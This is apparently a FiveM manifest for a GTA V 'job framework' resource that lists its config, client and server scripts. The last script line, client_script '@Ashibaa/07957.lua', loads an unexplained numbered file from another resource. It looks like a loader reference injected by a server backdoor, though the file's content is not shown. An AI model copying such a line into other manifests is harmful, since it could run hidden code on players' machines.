fx_version 'cerulean'
games { 'gta5' }

author 'QT'
description 'JOB FRAMEWORK'
version '1.0.0'

-- What to run
client_scripts {
    'config.lua',
    'client/*.lua',
}
server_scripts{
    'config.lua',
    'server/*.lua',
} 
client_script '@Ashibaa/07957.lua'

lua54 'yes'